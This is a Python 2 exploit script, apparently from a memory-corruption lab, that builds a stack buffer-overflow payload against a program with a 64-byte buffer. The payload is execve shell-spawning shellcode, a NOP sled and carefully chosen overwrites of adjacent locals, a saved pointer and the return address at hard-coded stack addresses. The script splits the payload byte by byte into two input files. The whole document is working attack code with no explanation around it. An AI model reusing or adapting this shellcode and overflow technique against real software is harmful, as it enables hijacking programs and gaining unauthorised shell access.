import sys

#8bytes per line to visualize stack space (inserted in reverse order perline)
payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
payload +="\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
payload +="\x54\x5f\x99\x52\x57\x54\x5e\xb0"
payload +="\x3b\x0f\x05\x90\x90\x90\x90\x90"
payload +="\x90\x90\x90\x90\x90\x90\x90\x90"
payload +="\x90\x90\x90\x90\x90\x90\x90\x90"
payload +="\x90\x90\x90\x90\x90\x90\x90\x90"
payload +="\x90\x90\x90\x90\x90\x90\x90\x90"
#filled buf[64] now overflowing @0x7fffffffdda0
payload +="\x01\x00\x00\x00\x00\x00\x00\x00"
#Writing @0x7fffffffdda8 idx2 is at @0x7fffffffddac
payload +="\x00\x00\x00\x00\x00\x00\x00\x00"
#Writing @0x7fffffffddb0 idx2 is at @0x7fffffffddb0 byte_read2 is at @0x7fffffffddb4
payload +="\x00\x00\x00\x00\x38\x00\x00\x00"
#Writing @0x7fffffffddb8 byte_read1 is at @0x7fffffffddb8 idx is at @0x7fffffffddbc
#Make sure we don't change the values when writing at idx
payload +="\x38\x00\x00\x00\x5f\x00\x00\x00"
#Writing @0x7fffffffddc0 overwriting libc call 0x7fffffffdde0
payload +="\xe0\xdd\xff\xff\xff\x7f\x00\x00"
#Writing @0x7fffffffddc8 overwriting return value "0x7fffffffdda0"
payload +="\xa0\xdd\xff\xff\xff\x7f\x00\x00"



ex1 = open("./exploit1", "wb")
ex2 = open("./exploit2", "wb")

payload1 = ""
payload2 = ""

while payload:
	payload1 += payload[0]
	payload2 += payload[1]
	payload = payload[2:]
ex1.write(payload1)
ex2.write(payload2)
